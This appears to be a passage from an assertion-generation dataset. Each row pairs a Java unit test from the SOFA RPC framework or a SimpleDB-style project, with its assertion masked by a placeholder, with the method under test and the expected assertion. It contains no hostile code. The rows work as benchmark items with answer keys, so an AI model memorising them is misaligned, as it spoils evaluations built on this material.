isEnable() { return EVENT_BUS_ENABLE; }"	assertEquals(EventBus.isEnable(), RpcConfigs.getBooleanValue(RpcOptions.EVENT_BUS_ENABLE))
"Exception { Assert.""<AssertPlaceHolder>""; }
isEnable(Class<? extends Event> eventClass) { return EVENT_BUS_ENABLE && CommonUtils.isNotEmpty(SUBSCRIBER_MAP.get(eventClass)); }"	assertEquals(EventBus.isEnable(NullTestEvent.class), false)
"testDynamicLoadExtension() { ExtensionLoader<Filter> extensionLoader = ExtensionLoaderFactory.getExtensionLoader(Filter.class); extensionLoader.loadExtension(DynamicFilter.class); Filter dynamic0 = extensionLoader.getExtension(""dynamic0""); Assert.""<AssertPlaceHolder>""; }
getExtension(String alias) { ExtensionClass<T> extensionClass = getExtensionClass(alias); if (extensionClass == null) { throw new SofaRpcRuntimeException(LogCodes.getLog(LogCodes.ERROR_EXTENSION_NOT_FOUND, interfaceName, alias)); } else { if (extensible.singleton() && factory != null) { T t = factory.get(alias); if (t == null) { synchronized (this) { t = factory.get(alias); if (t == null) { t = extensionClass.getExtInstance(); factory.put(alias, t); } } } return t; } else { return extensionClass.getExtInstance(); } } }"	assertTrue(dynamic0 instanceof DynamicFilter)
"Exception { boolean error = false; try { new ExcludeFilter(""*"").invoke(null, null); } catch (Exception e) { error = e instanceof UnsupportedOperationException; } Assert.""<AssertPlaceHolder>""; }
invoke(FilterInvoker invoker, SofaRequest request) throws SofaRpcException { throw new UnsupportedOperationException(); }"	assertTrue(error)
"Exception { Assert.""<AssertPlaceHolder>""; }
getExcludeName() { return excludeName; }"	"assertEquals(new ExcludeFilter(""*"").getExcludeName(), ""*"")"
"Exception { Assert.""<AssertPlaceHolder>""; }
getLog(String code) { if (!LOG_CODES.containsKey(code)) { LOGGER.error(CODE_DOES_NOT_EXIST + code); return CODE_DOES_NOT_EXIST + code; } try { return String.format(LOG, code, LOG_CODES.get(code), LogCodes.NOTE); } catch (Throwable e) { LOGGER.error(LOG_FORMAT_ERROR + code, e); } return LOG_FORMAT_ERROR + code; }"	assertNotNull(LogCodes.getLog(LogCodes.ERROR_RPC_LOG_LOAD))
"InterruptedException { TimeWaitLogger timeWaitLogger = new TimeWaitLogger(1000); AtomicLong atomicLong = new AtomicLong(); new Thread(()->{ while (true){ timeWaitLogger.logWithRunnable(atomicLong::incrementAndGet); } }).start(); Thread.sleep(1500); Assert.""<AssertPlaceHolder>""; }
logWithRunnable(Runnable runnable) { long currentTimeMillis = System.currentTimeMillis(); if (disabled) { runnable.run(); } else if (currentTimeMillis > lastLogTime + waitTime) { lastLogTime = currentTimeMillis; runnable.run(); }  }"	assertEquals(2L,atomicLong.get())
"Exception { Assert.""<AssertPlaceHolder>""; }
getCommand() { return ""help""; }"	"assertEquals(new HelpTelnetHandler().getCommand(), ""help"")"
"Exception { Assert.""<AssertPlaceHolder>""; }
getDescription() { return ""show all support commands!"" + LINE + ""Usage:\thelp"" + LINE + ""\thelp [cmd]""; }"	assertNotNull(new HelpTelnetHandler().getDescription())
"getInvoker() { Invoker invoke = ProxyFactory.getInvoker(null, ""test""); Assert.""<AssertPlaceHolder>""; }
getInvoker(Object proxyObject, String proxyType) { try { ExtensionClass<Proxy> ext = ExtensionLoaderFactory.getExtensionLoader(Proxy.class) .getExtensionClass(proxyType); if (ext == null) { throw new SofaRpcRuntimeException(LogCodes.getLog(LogCodes.ERROR_LOAD_EXT, ""Registry"", proxyType)); } Proxy proxy = ext.getExtInstance(); return proxy.getInvoker(proxyObject); } catch (SofaRpcRuntimeException e) { throw e; } catch (Throwable e) { throw new SofaRpcRuntimeException(LogCodes.getLog(LogCodes.ERROR_LOAD_EXT, ""Registry"", proxyType)); } }"	assertEquals(invoke, null)
"readAndWriteLock() {  final HashMap<String, String> map = new HashMap<String, String>(); map.put(""xx"", ""yy""); final SofaConfigs.ExternalConfigLoader loader = new SofaConfigs.ExternalConfigLoader() { @Override public String getValue(String key) { return map.get(key); }  @Override public String getValue(String appName, String key) { return map.get(key); } };  final AtomicBoolean run = new AtomicBoolean(true); final AtomicBoolean error = new AtomicBoolean(false); // 有没有发生异常，例如死锁等 final CountDownLatch latch = new CountDownLatch(1); // 出现异常 跳出等待 Thread readThread = new Thread(new Runnable() { @Override public void run() { while (run.get()) { try { // 不停的读取 SofaConfigs.getStringValue(""xx"", null); } catch (Exception e) { e.printStackTrace(); error.set(true); latch.countDown(); } } } }, ""readThread""); Thread writeThread = new Thread(new Runnable() { boolean sw = false;  @Override public void run() { while (run.get()) { try { // 不停的注册 反注册 if (!sw) { SofaConfigs.registerExternalConfigLoader(loader); } else { SofaConfigs.unRegisterExternalConfigLoader(loader); } } catch (Exception e) { e.printStackTrace(); error.set(true); latch.countDown(); } finally { sw = !sw; } } } }, ""writeThread""); readThread.start(); writeThread.start();  // 正常跑3秒 或者出异常 try { latch.await(3000, TimeUnit.MILLISECONDS); } catch (InterruptedException e) { e.printStackTrace(); } finally { run.set(false); } Assert.""<AssertPlaceHolder>""; }
unRegisterExternalConfigLoader(ExternalConfigLoader configLoader) { wLock.lock(); try { CONFIG_LOADERS.remove(configLoader); Collections.sort(CONFIG_LOADERS, new OrderedComparator<ExternalConfigLoader>()); } finally { wLock.unlock(); } }"	assertFalse(error.get())
"testDeserializeSpecialCharter() { String s = ""{""a"": ""\\b\\t\\n\\f\\r\\u771f\\u7684\\u5417\\uff1f\\u54c8\\u54c8\\u0068\\u0061\\u0068\\u0061"" }""; Map json = (Map) JSONSerializer.deserialize(s); Assert.""<AssertPlaceHolder>""; }
deserialize(String json) throws ParseException { // 去掉注释 return new JSONSerializer(json).nextValue(); }"	"assertEquals(json.get(""a""), ""\b\t\n\f\r真的吗？哈哈haha"")"
"Exception { List<Method> methods = ClassUtils.getAllMethods(TestBean.class); Assert.""<AssertPlaceHolder>""; }
getAllMethods(Class clazz) { List<Method> all = new ArrayList<Method>(); for (Class<?> c = clazz; c != Object.class && c != null; c = c.getSuperclass()) { Method[] methods = c.getDeclaredMethods(); // 所有方法，不包含父类 for (Method method : methods) { int mod = method.getModifiers(); // native的不要 if (Modifier.isNative(mod)) { continue; } method.setAccessible(true); // 不管private还是protect都可以 all.add(method); } } return all; }"	assertTrue(methods.size() >= 8)
"Exception { List<Field> fields = ClassUtils.getAllFields(TestBean.class); Assert.""<AssertPlaceHolder>""; }
getAllFields(Class clazz) { List<Field> all = new ArrayList<Field>(); for (Class<?> c = clazz; c != Object.class && c != null; c = c.getSuperclass()) { Field[] fields = c.getDeclaredFields(); // 所有方法，不包含父类 for (Field field : fields) { int mod = field.getModifiers(); // 过滤static 和 transient，支持final if (Modifier.isStatic(mod) || Modifier.isTransient(mod)) { continue; } field.setAccessible(true); // 不管private还是protect都可以 all.add(field); } } return all; }"	assertEquals(fields.size(), 4)
"buildHigh4Low4Bytes() { byte bs = CodecUtils.buildHigh4Low4Bytes((byte) 7, (byte) 5); Assert.""<AssertPlaceHolder>""; }
buildHigh4Low4Bytes(byte high4, byte low4) { return (byte) ((high4 << 4) + low4); }"	assertEquals(bs, (byte) 117)
"buildHigh2Low6Bytes() { byte bs = CodecUtils.buildHigh2Low6Bytes((byte) 1, (byte) 53); Assert.""<AssertPlaceHolder>""; }
buildHigh2Low6Bytes(byte high2, byte low6) { return (byte) ((high2 << 6) + low6); }"	assertEquals(bs, (byte) 117)
"byteToBits() { byte b = 0x35; // 0011 0101 Assert.""<AssertPlaceHolder>""; }
byteToBits(byte b) { return """" + (byte) ((b >> 7) & 0x01) + (byte) ((b >> 6) & 0x1) + (byte) ((b >> 5) & 0x01) + (byte) ((b >> 4) & 0x1) + (byte) ((b >> 3) & 0x01) + (byte) ((b >> 2) & 0x1) + (byte) ((b >> 1) & 0x01) + (byte) ((b >> 0) & 0x1); }"	"assertEquals(CodecUtils.byteToBits(b), ""00110101"")"
"Exception { final ConcurrentMap<String, AtomicInteger> hashMap = new ConcurrentHashMap<String, AtomicInteger>(); final CountDownLatch latch = new CountDownLatch(3); for (int i = 0; i < 3; i++) { Thread thread = new Thread(new Runnable() { @Override public void run() { for (int j = 0; j < 10000; j++) { AtomicInteger inter = CommonUtils.putToConcurrentMap(hashMap, ""key"", new AtomicInteger(0)); inter.incrementAndGet(); } latch.countDown(); } }); thread.start(); } latch.await(); Assert.""<AssertPlaceHolder>""; }
putToConcurrentMap(ConcurrentMap<K, V> map, K key, V value) { V old = map.putIfAbsent(key, value); return old != null ? old : value; }"	"assertEquals(hashMap.get(""key"").get(), 30000)"
"Exception { long now = System.currentTimeMillis(); int delay = DateUtils.getDelayToNextMinute(now); Assert.""<AssertPlaceHolder>""; }
getDelayToNextMinute(long rightnow) { return (int) (MILLISECONDS_PER_MINUTE - (rightnow % MILLISECONDS_PER_MINUTE)); }"	assertTrue(delay < 60000)
"Exception { long now = System.currentTimeMillis(); long pre = DateUtils.getPreMinuteMills(now); Assert.""<AssertPlaceHolder>""; }
getPreMinuteMills(long rightnow) { return rightnow - (rightnow % MILLISECONDS_PER_MINUTE) - 1; }"	assertTrue(now - pre < 60000)
"Exception { Assert.""<AssertPlaceHolder>""; }
getBaseDirName() { String fileName = null; // 先取classes java.net.URL url1 = FileUtils.class.getResource(""/""); if (url1 != null) { fileName = url1.getFile(); } else { // 取不到再取lib String jarpath = ReflectUtils.getCodeBase(FileUtils.class); if (jarpath != null) { int sofaidx = jarpath.lastIndexOf(""sofa""); if (sofaidx > -1) { // 如果有sofa开头的jar包 fileName = jarpath.substring(0, sofaidx); } else { int sepidx = jarpath.lastIndexOf(File.separator); if (sepidx > -1) { fileName = jarpath.substring(0, sepidx + 1); } } } } // 将冒号去掉 “/”换成“-” if (fileName != null) { fileName = fileName.replace("":"", """").replace(File.separator, ""/"") .replace(""/"", ""-""); if (fileName.startsWith(""-"")) { fileName = fileName.substring(1); } } else { // LOGGER.warn(""can not parse webapp baseDir path""); fileName = ""UNKNOW_""; } return fileName; }"	assertNotNull(FileUtils.getBaseDirName())
"readAndWriteLock() { final SingleGroupAddressHolder addressHolder = new SingleGroupAddressHolder(null); final Random random = new Random(); final AtomicBoolean run = new AtomicBoolean(true); final AtomicBoolean error = new AtomicBoolean(false); // 有没有发生异常，例如死锁等 final CountDownLatch latch = new CountDownLatch(1); // 出现异常 跳出等待 Thread readThread = new Thread(new Runnable() { @Override public void run() { while (run.get()) { try { // 不停的读取 addressHolder.getProviderGroups(); } catch (Exception e) { error.set(true); latch.countDown(); } } } }, ""readThread""); Thread writeThread = new Thread(new Runnable() { @Override public void run() { while (run.get()) { try { // 不停的变更 addressHolder.updateAllProviders(Arrays.asList( new ProviderGroup(""xxx"", Arrays.asList(ProviderHelper.toProviderInfo(""127.0.0.1:"" + random.nextInt(65535)))), new ProviderGroup(ADDRESS_DIRECT_GROUP, Arrays.asList(ProviderHelper.toProviderInfo(""127.0.0.1:"" + random.nextInt(65535)))))); } catch (Exception e) { error.set(true); latch.countDown(); } } } }, ""writeThread""); readThread.start(); writeThread.start();  // 正常跑3秒 或者出异常 try { latch.await(3000, TimeUnit.MILLISECONDS); } catch (InterruptedException e) { e.printStackTrace(); } finally { run.set(false); } Assert.""<AssertPlaceHolder>""; }
getProviderGroups() { rLock.lock(); try { List<ProviderGroup> list = new ArrayList<ProviderGroup>(); list.add(registryGroup); list.add(directUrlGroup); return list; } finally { rLock.unlock(); } }"	assertFalse(error.get())
"Exception {  ConsistentHashLoadBalancer loadBalancer = new ConsistentHashLoadBalancer(null);  Map<Integer, Integer> cnt = new HashMap<Integer, Integer>(); int size = 20; int total = 100000; SofaRequest request = new SofaRequest(); request.setInterfaceName(ConsistentHashLoadBalancerTest.class.getName()); request.setMethod(ConsistentHashLoadBalancerTest.class.getMethod(""doSelect"")); for (int i = 0; i < size; i++) { cnt.put(9000 + i, 0); } List<ProviderInfo> providers = buildSameWeightProviderList(size); long start = System.currentTimeMillis(); for (int i = 0; i < total; i++) { ProviderInfo provider = loadBalancer.doSelect(request, providers); int port = provider.getPort(); cnt.put(port, cnt.get(port) + 1); } long end = System.currentTimeMillis(); LOGGER.info(""elapsed"" + (end - start) + ""ms""); LOGGER.info(""avg "" + (end - start) * 1000 * 1000 / total + ""ns"");  int count = 0; for (int i = 0; i < size; i++) { if (cnt.get(9000 + i) > 0) { count++; } } Assert.""<AssertPlaceHolder>"";// 应该落在一台机器上  }
doSelect(SofaRequest request, List<ProviderInfo> providerInfos) { String interfaceId = request.getInterfaceName(); String method = request.getMethodName(); String key = interfaceId + ""#"" + method; int hashcode = providerInfos.hashCode(); // 判断是否同样的服务列表 Selector selector = selectorCache.get(key); if (selector == null // 原来没有 || selector.getHashCode() != hashcode) { // 或者服务列表已经变化 selector = new Selector(interfaceId, method, providerInfos, hashcode); selectorCache.put(key, selector); } return selector.select(request); }"	assertTrue(count == 1)
"Exception {  WeightConsistentHashLoadBalancer loadBalancer = new WeightConsistentHashLoadBalancer(null);  Map<Integer, Integer> cnt = new HashMap<Integer, Integer>(40); int size = 20; int total = 100000; SofaRequest request = new SofaRequest(); request.setInterfaceName(ConsistentHashLoadBalancerTest.class.getName()); request.setMethod(ConsistentHashLoadBalancerTest.class.getMethod(""doSelect"")); for (int i = 0; i < size; i++) { cnt.put(9000 + i, 0); } List<ProviderInfo> providers = buildDiffWeightProviderList(size); long start = System.currentTimeMillis(); for (int i = 0; i < total; i++) { ProviderInfo provider = loadBalancer.doSelect(request, providers); int port = provider.getPort(); cnt.put(port, cnt.get(port) + 1); } long end = System.currentTimeMillis(); System.out.println(""elapsed"" + (end - start) + ""ms""); System.out.println(""avg "" + (end - start) * 1000 * 1000 / total + ""ns"");  int count = 0; for (int i = 0; i < size; i++) { if (cnt.get(9000 + i) > 0) { count++; } } // 应该落在同一台机器上 Assert.""<AssertPlaceHolder>"";  }
doSelect(SofaRequest request, List<ProviderInfo> providerInfos) { String interfaceId = request.getInterfaceName(); String method = request.getMethodName(); String key = interfaceId + ""#"" + method; // 判断是否同样的服务列表 int hashcode = providerInfos.hashCode(); Selector selector = selectorCache.get(key); // 原来没有 if (selector == null || // 或者服务列表已经变化 selector.getHashCode() != hashcode) { selector = new Selector(interfaceId, method, providerInfos, hashcode); selectorCache.put(key, selector); } return selector.select(request); }"	assertTrue(count == 1)
"Exception { Assert.""<AssertPlaceHolder>""; }
getConfig(String appName) { if (appName == null) { return DEFAULT_CFG; } else { FaultToleranceConfig config = APP_CONFIGS.get(appName); return config == null ? DEFAULT_CFG : config; } }"	assertNotNull(FaultToleranceConfigManager.getConfig(null))
"Exception { Assert.""<AssertPlaceHolder>""; }
getLeastCallCount(String appName) { FaultToleranceConfig config = getConfig(appName); return config.getLeastCallCount(); }"	assertEquals(FaultToleranceConfigManager.getLeastCallCount(null), defaultConfig.getLeastCallCount())
"InterruptedException { final MeasureStrategy measureStrategy = new ServiceHorizontalMeasureStrategy(); final AtomicInteger isNullCount = new AtomicInteger(0); final CountDownLatch countDownLatch = new CountDownLatch(20);  for (int i = 0; i < 20; i++) { new Thread(new Runnable() { @Override public void run() { InvocationStatDimension invocation1 = new InvocationStatDimension( ProviderHelper.toProviderInfo(""ip1""), consumerConfig); MeasureModel measureModel1 = measureStrategy.buildMeasureModel(new ServiceExceptionInvocationStat( invocation1)); if (measureModel1 == null) { isNullCount.incrementAndGet(); } countDownLatch.countDown(); } }).start(); }  countDownLatch.await(); Assert.""<AssertPlaceHolder>"";  }
buildMeasureModel(InvocationStat invocationStat);"	assertTrue(isNullCount.get() == 19)
"testIsDegradeEffective() { RegulationStrategy regulationStrategy = new ServiceHorizontalRegulationStrategy(); FaultToleranceConfig config = new FaultToleranceConfig(); config.setDegradeEffective(true); FaultToleranceConfigManager.putAppConfig(APP_NAME1, config); InvocationStatDimension invocationA = new InvocationStatDimension(ProviderHelper.toProviderInfo(""ip""), consumerConfig); MeasureResultDetail measureResultDetailA = new MeasureResultDetail(invocationA, MeasureState.ABNORMAL); Assert.""<AssertPlaceHolder>""; }
isDegradeEffective(MeasureResultDetail measureResultDetail);"	assertTrue(regulationStrategy.isDegradeEffective(measureResultDetailA))
"testNeedLoad() { LookoutModule lookoutModule = new LookoutModule(); Assert.""<AssertPlaceHolder>""; }
needLoad() { try { Class.forName(""com.alipay.lookout.spi.MetricsImporterLocator""); return true; } catch (Exception e) { return false; } }"	assertEquals(true, lookoutModule.needLoad())
"IllegalAccessException {  SimpleMeterRegistry registry = new SimpleMeterRegistry(); try (SofaRpcMetrics metrics = new SofaRpcMetrics()) { metrics.bindTo(registry);  Method handleEvent = EventBus.class.getDeclaredMethod( ""handleEvent"", Subscriber.class, Event.class); handleEvent.setAccessible(true); SofaRequest request = buildRequest(); SofaResponse response = buildResponse(); RpcInternalContext.getContext() .setAttachment(RpcConstants.INTERNAL_KEY_CLIENT_ELAPSE, 100) .setAttachment(RpcConstants.INTERNAL_KEY_IMPL_ELAPSE, 10) .setAttachment(RpcConstants.INTERNAL_KEY_REQ_SIZE, 3) .setAttachment(RpcConstants.INTERNAL_KEY_RESP_SIZE, 4);  handleEvent.invoke(EventBus.class, metrics, new ClientEndInvokeEvent(request, response, null)); handleEvent.invoke(EventBus.class, metrics, new ServerSendEvent(request, response, null)); ServerConfig serverConfig = new ServerConfig(); handleEvent.invoke(EventBus.class, metrics, new ServerStartedEvent(serverConfig, new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue<>()))); handleEvent.invoke(EventBus.class, metrics, new ServerStoppedEvent(serverConfig)); handleEvent.invoke(EventBus.class, metrics, new ProviderPubEvent(new ProviderConfig<>())); handleEvent.invoke(EventBus.class, metrics, new ConsumerSubEvent(new ConsumerConfig<>()));  Assert.""<AssertPlaceHolder>""; } }
bindTo(MeterRegistry registry) { Gauge.builder(""sofa.threadpool.config.core"", () -> Optional.of(serverConfig) .map(AtomicReference::get) .map(ServerConfig::getCoreThreads) .orElse(0)) .tags(common) .baseUnit(BaseUnits.THREADS) .register(registry); Gauge.builder(""sofa.threadpool.config.max"", () -> Optional.of(serverConfig) .map(AtomicReference::get) .map(ServerConfig::getMaxThreads) .orElse(0)) .tags(common) .baseUnit(BaseUnits.THREADS) .register(registry); Gauge.builder(""sofa.threadpool.config.queue"", () -> Optional.of(serverConfig) .map(AtomicReference::get) .map(ServerConfig::getQueues) .orElse(0)) .tags(common) .baseUnit(BaseUnits.TASKS) .register(registry); Gauge.builder(""sofa.threadpool.active"", () -> Optional.of(executor) .map(AtomicReference::get) .map(ThreadPoolExecutor::getActiveCount) .orElse(0)) .tags(common) .baseUnit(BaseUnits.THREADS) .register(registry); Gauge.builder(""sofa.threadpool.idle"", () -> Optional.of(executor) .map(AtomicReference::get) .map(e -> e.getPoolSize() - e.getActiveCount()) .orElse(0)) .tags(common) .baseUnit(BaseUnits.THREADS) .register(registry); Gauge.builder(""sofa.threadpool.queue.size"", () -> Optional.of(executor) .map(AtomicReference::get) .map(ThreadPoolExecutor::getQueue) .map(Collection::size) .orElse(0)) .tags(common) .baseUnit(BaseUnits.TASKS) .register(registry); provider = Counter.builder(""sofa.provider"") .tags(common) .register(registry); consumer = Counter.builder(""sofa.consumer"") .tags(common) .register(registry);  initialed.set(registry); }"	assertEquals(12, registry.getMeters().size())
"testApplicationInfo() { ApplicationInfoRequest request = new ApplicationInfoRequest(); request.setAppName(""test""); boolean result = meshApiClient.registeApplication(request); Assert.""<AssertPlaceHolder>""; }
registeApplication(ApplicationInfoRequest applicationInfoRequest) {  final String json = applicationInfoRequest.toJson(); String result = httpPost(MeshEndpoint.CONFIGS, json);  if (!StringUtils.equals(result, errorMessage)) { final ApplicationInfoResult parse = JSON.parseObject(result, ApplicationInfoResult.class); if (parse.isSuccess()) { return true; } return false; } else { return false; }  }"	assertTrue(result)
"testPublish() { PublishServiceRequest request = new PublishServiceRequest(); request.setServiceName(""aa""); ProviderMetaInfo providerMetaInfo = new ProviderMetaInfo(); providerMetaInfo.setAppName(""testApp""); providerMetaInfo.setProtocol(""bolt""); providerMetaInfo.setSerializeType(""hessian2""); providerMetaInfo.setVersion(""4.0""); request.setProviderMetaInfo(providerMetaInfo); boolean result = meshApiClient.publishService(request); Assert.""<AssertPlaceHolder>""; }
publishService(PublishServiceRequest publishServiceRequest) {  final String json = JSON.toJSONString(publishServiceRequest); String result = httpPost(MeshEndpoint.PUBLISH, json); if (!StringUtils.equals(result, errorMessage)) { final PublishServiceResult parse = JSON.parseObject(result, PublishServiceResult.class); if (parse.isSuccess()) { return true; } return false; } else { return false; } }"	assertTrue(result)
"testUnPublish() { UnPublishServiceRequest request = new UnPublishServiceRequest(); request.setServiceName(""aa""); int result = meshApiClient.unPublishService(request); Assert.""<AssertPlaceHolder>""; }
unPublishService(UnPublishServiceRequest request) {  final String json = JSON.toJSONString(request); String result = httpPost(MeshEndpoint.UN_PUBLISH, json);  if (!StringUtils.equals(result, errorMessage)) { final UnPublishServiceResult parse = JSON.parseObject(result, UnPublishServiceResult.class); if (parse.isSuccess()) { return 1; } return 0; } else { return 0; }  }"	assertEquals(1, result)
"testSubscribe() { //11.166.22.163:12200?_TIMEOUT=3000&p=1&_SERIALIZETYPE=protobuf&_WARMUPTIME=0&_WARMUPWEIGHT=10&app_name=bar1&zone=GZ00A&_MAXREADIDLETIME=30&_IDLETIMEOUT=27&v=4.0&_WEIGHT=100&startTime=1524565802559 SubscribeServiceRequest request = new SubscribeServiceRequest(); request.setServiceName(""com.alipay.rpc.common.service.facade.pb.SampleServicePb:1.0""); SubscribeServiceResult result = meshApiClient.subscribeService(request); Assert.""<AssertPlaceHolder>""; }
subscribeService(SubscribeServiceRequest subscribeServiceRequest) { final String json = JSON.toJSONString(subscribeServiceRequest);  String result = httpPost(MeshEndpoint.SUBCRIBE, json);  SubscribeServiceResult subscribeServiceResult; if (!StringUtils.equals(result, errorMessage)) { subscribeServiceResult = JSON.parseObject(result, SubscribeServiceResult.class); return subscribeServiceResult; } else { subscribeServiceResult = new SubscribeServiceResult(); return subscribeServiceResult; } }"	assertTrue(result.isSuccess())
"testUnSubscribe() { UnSubscribeServiceRequest request = new UnSubscribeServiceRequest(); request.setServiceName(""com.alipay.rpc.common.service.facade.pb.SampleServicePb:1.0@DEFAULT""); boolean result = meshApiClient.unSubscribeService(request); Assert.""<AssertPlaceHolder>""; }
unSubscribeService(UnSubscribeServiceRequest request) { final String json = JSON.toJSONString(request);  String result = httpPost(MeshEndpoint.UN_SUBCRIBE, json);  if (!StringUtils.equals(result, errorMessage)) { final UnSubscribeServiceResult parse = JSON.parseObject(result, UnSubscribeServiceResult.class); if (parse.isSuccess()) { return true; } return false; } else { return false; } }"	assertTrue(result)
"InterruptedException {  Field registedAppField = null; try { registedAppField = MeshRegistry.class.getDeclaredField(""registedApp""); registedAppField.setAccessible(true); } catch (NoSuchFieldException e) { e.printStackTrace(); }  Boolean registedAppValue = null; // in case of effected by other case. try { registedAppValue = (Boolean) registedAppField.get(registry); registedAppField.set(registry, false); } catch (IllegalAccessException e) { e.printStackTrace(); }  ServerConfig serverConfig = new ServerConfig() .setProtocol(""bolt"") .setHost(""0.0.0.0"") .setPort(12200); ProviderConfig<?> provider = new ProviderConfig(); provider.setInterfaceId(""com.alipay.xxx.TestService"") .setUniqueId(""unique123Id"") .setApplication(new ApplicationConfig().setAppName(""test-server"")) .setProxy(""javassist"") .setRegister(true) .setRegistry(registryConfig) .setSerialization(""hessian2"") .setServer(serverConfig) .setWeight(222) .setTimeout(3000);  registry.register(provider); Thread.sleep(3000);  try { registedAppValue = (Boolean) registedAppField.get(registry); } catch (IllegalAccessException e) { e.printStackTrace(); }  LOGGER.info(""final registedAppValue is "" + registedAppValue);  Assert.""<AssertPlaceHolder>""; }
register(ProviderConfig config) { String appName = config.getAppName(); if (!registryConfig.isRegister()) { if (LOGGER.isInfoEnabled(appName)) { LOGGER.infoWithApp(appName, LogCodes.getLog(LogCodes.INFO_REGISTRY_IGNORE)); } return; } if (!config.isRegister()) { // 注册中心不注册或者服务不注册 return; } List<ServerConfig> serverConfigs = config.getServer(); if (CommonUtils.isNotEmpty(serverConfigs)) { for (ServerConfig server : serverConfigs) { String serviceName = MeshRegistryHelper.buildMeshKey(config, server.getProtocol()); ProviderInfo providerInfo = MeshRegistryHelper.convertProviderToProviderInfo(config, server); if (LOGGER.isInfoEnabled(appName)) { LOGGER.infoWithApp(appName, LogCodes.getLog(LogCodes.INFO_ROUTE_REGISTRY_PUB_START, serviceName)); } doRegister(appName, serviceName, providerInfo, server.getProtocol());  if (LOGGER.isInfoEnabled(appName)) { LOGGER.infoWithApp(appName, LogCodes.getLog(LogCodes.INFO_ROUTE_REGISTRY_PUB_OVER, serviceName)); } } if (EventBus.isEnable(ProviderPubEvent.class)) { ProviderPubEvent event = new ProviderPubEvent(config); EventBus.post(event); }  } }"	assertTrue(registedAppValue)
"testProviderPressure() { Metadata metadata = new Metadata(); metadata.put(HEAD_KEY_TRAFFIC_TYPE, ""pressure""); Context context = Context.current().withValue(TracingContextKey.getKeyMetadata(), metadata); context.attach();  PressureMarkTransformFilter filter = new PressureMarkTransformFilter(); filter.invoke(invoker, request);  SofaTracerSpan currentSpan = SofaTraceContextHolder.getSofaTraceContext().getCurrentSpan(); Assert.""<AssertPlaceHolder>""; }
invoke(FilterInvoker invoker, SofaRequest request) throws SofaRpcException { // consumer side, if in provider side,loadTest always false SofaTracerSpan currentSpan = SofaTraceContextHolder.getSofaTraceContext().getCurrentSpan(); boolean loadTest = TracerUtils.isLoadTest(currentSpan); if (loadTest) { Map<String, String> metaHolder = MetadataHolder.getMetaHolder(); metaHolder.put(HEAD_KEY_TRAFFIC_TYPE.name(), PRESSURE); }  // provider side ,if in consumer side, metadata == null Metadata metadata = TracingContextKey.getKeyMetadata().get(); if (metadata != null) { String s = metadata.get(HEAD_KEY_TRAFFIC_TYPE); if (PRESSURE.equals(s)) { currentSpan.getSofaTracerSpanContext().setBizBaggageItem(MARK, T); } } try { return invoker.invoke(request); } finally { MetadataHolder.clear(); } }"	assertTrue(TracerUtils.isLoadTest(currentSpan))
"testNoProviderPressure() { Metadata metadata = new Metadata(); Context context = Context.current().withValue(TracingContextKey.getKeyMetadata(), metadata); context.attach();  PressureMarkTransformFilter filter = new PressureMarkTransformFilter(); filter.invoke(invoker, request);  SofaTracerSpan currentSpan = SofaTraceContextHolder.getSofaTraceContext().getCurrentSpan(); Assert.""<AssertPlaceHolder>""; }
invoke(FilterInvoker invoker, SofaRequest request) throws SofaRpcException { // consumer side, if in provider side,loadTest always false SofaTracerSpan currentSpan = SofaTraceContextHolder.getSofaTraceContext().getCurrentSpan(); boolean loadTest = TracerUtils.isLoadTest(currentSpan); if (loadTest) { Map<String, String> metaHolder = MetadataHolder.getMetaHolder(); metaHolder.put(HEAD_KEY_TRAFFIC_TYPE.name(), PRESSURE); }  // provider side ,if in consumer side, metadata == null Metadata metadata = TracingContextKey.getKeyMetadata().get(); if (metadata != null) { String s = metadata.get(HEAD_KEY_TRAFFIC_TYPE); if (PRESSURE.equals(s)) { currentSpan.getSofaTracerSpanContext().setBizBaggageItem(MARK, T); } } try { return invoker.invoke(request); } finally { MetadataHolder.clear(); } }"	assertFalse(TracerUtils.isLoadTest(currentSpan))
"Exception { this.rpcSofaTracer.startRpc(sofaRequest);  SofaTraceContext sofaTraceContext = SofaTraceContextHolder.getSofaTraceContext(); SofaTracerSpan sofaTracerSpan = sofaTraceContext.pop(); ""<AssertPlaceHolder>""; System.err.println(""\n"" + sofaTracerSpan); }
startRpc(SofaRequest request) { //客户端的启动 SofaTraceContext sofaTraceContext = SofaTraceContextHolder.getSofaTraceContext(); SofaTracerSpan serverSpan = sofaTraceContext.pop();  SofaTracerSpan clientSpan = (SofaTracerSpan) this.sofaTracer.buildSpan(request.getInterfaceName()) .asChildOf(serverSpan) .withTag(Tags.SPAN_KIND.getKey(), Tags.SPAN_KIND_CLIENT) .start();  if (RpcInternalContext.isAttachmentEnable()) { RpcInternalContext context = RpcInternalContext.getContext(); clientSpan .setTag(RpcSpanTags.LOCAL_APP, (String) context.getAttachment(RpcConstants.INTERNAL_KEY_APP_NAME)); clientSpan.setTag(RpcSpanTags.PROTOCOL, (String) context.getAttachment(RpcConstants.INTERNAL_KEY_PROTOCOL_NAME)); SofaTracerSpanContext spanContext = clientSpan.getSofaTracerSpanContext(); if (spanContext != null) { context.setAttachment(RpcConstants.INTERNAL_KEY_TRACE_ID, spanContext.getTraceId()); context.setAttachment(RpcConstants.INTERNAL_KEY_SPAN_ID, spanContext.getSpanId()); } }  clientSpan.setTag(RpcSpanTags.SERVICE, request.getTargetServiceUniqueName()); clientSpan.setTag(RpcSpanTags.METHOD, request.getMethodName()); clientSpan.setTag(RpcSpanTags.CURRENT_THREAD_NAME, Thread.currentThread().getName());  //需要主动缓存自己的 serverSpan,原因是:asChildOf 关注的是 spanContext clientSpan.setParentSofaTracerSpan(serverSpan); //push sofaTraceContext.push(clientSpan); }"	assertNotNull(sofaTracerSpan)
"""<AssertPlaceHolder>"";
getNumSlots() { return getHeaderSize() * 8; }"	assertEquals(32704, BTreeHeaderPage.getNumSlots())
"""<AssertPlaceHolder>"";
getTableId() { return tableId; }"	assertEquals(1, rootPtrId.getTableId())
"""<AssertPlaceHolder>"";
getPageNumber() { return pgNo; }"	assertEquals(0, rootPtrId.getPageNumber())
"""<AssertPlaceHolder>"";
getTableId(String name) throws NoSuchElementException { // some code goes here if (!this.nameToIdMap.containsKey(name)) { throw new NoSuchElementException(); } return this.nameToIdMap.get(name); }"	assertEquals(id2, Database.getCatalog().getTableId(name))
"""<AssertPlaceHolder>"";
getTableId() { // some code goes here return this.tableId; }"	assertEquals(1, pid.getTableId())
"""<AssertPlaceHolder>"";
getPageNumber() { return this.pageNum; }"	assertEquals(1, pid.getPageNumber())
